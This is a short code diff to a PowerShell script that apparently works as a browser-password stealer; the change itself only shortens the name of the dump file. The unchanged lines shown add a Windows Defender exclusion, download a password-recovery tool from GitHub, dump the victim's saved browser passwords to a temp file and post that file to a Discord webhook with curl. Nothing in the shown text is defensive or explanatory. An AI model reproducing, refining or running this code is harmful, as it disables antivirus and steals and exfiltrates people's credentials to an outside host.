@@ -4,7 +4,7 @@ Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antiviru
 
 Invoke-WebRequest https://raw.githubusercontent.com/bindas88/bd/main/bin/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 
-.\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
+.\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-passwords.txt #Create the file for Browser passwords
 
 Start-Sleep -Seconds 10
 
@@ -37,5 +37,5 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($hookurl))){Upload-Discord -file "$env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"}
+if (-not ([string]::IsNullOrEmpty($hookurl))){Upload-Discord -file "$env:TEMP/$env:USERNAME-passwords.txt"}
 
